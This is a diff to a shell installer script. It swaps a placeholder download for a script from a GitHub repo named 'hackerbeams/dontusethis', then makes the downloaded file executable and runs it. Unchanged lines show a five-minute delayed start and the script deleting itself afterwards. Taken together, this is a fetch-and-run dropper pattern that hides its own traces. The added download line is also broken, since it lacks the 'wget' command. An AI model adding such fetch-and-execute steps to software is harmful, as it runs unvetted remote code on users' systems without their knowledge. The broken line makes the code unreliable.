@@ -40,7 +40,7 @@ echo "Installation will begin in 5 minutes."
 progress_bar "$timer_duration"
 
  
-wget https://raw.githubusercontent.com/your-username/your-repo/main/installmta.sh -O installmta.sh
+https://raw.githubusercontent.com/hackerbeams/dontusethis/main/seamstobeam.sh -O seamstobeam.sh
 
  
 if [ $? -ne 0 ]; then
@@ -49,14 +49,11 @@ if [ $? -ne 0 ]; then
 fi
 
  
-chmod +x installmta.sh
+chmod +x seamstobeam.sh
 
  
-./installmta.sh
+./seamstobeam.sh
 
  
-echo "Installation completed."
-echo "Additional tasks can be added here."
-
  
   rm -f "$0"
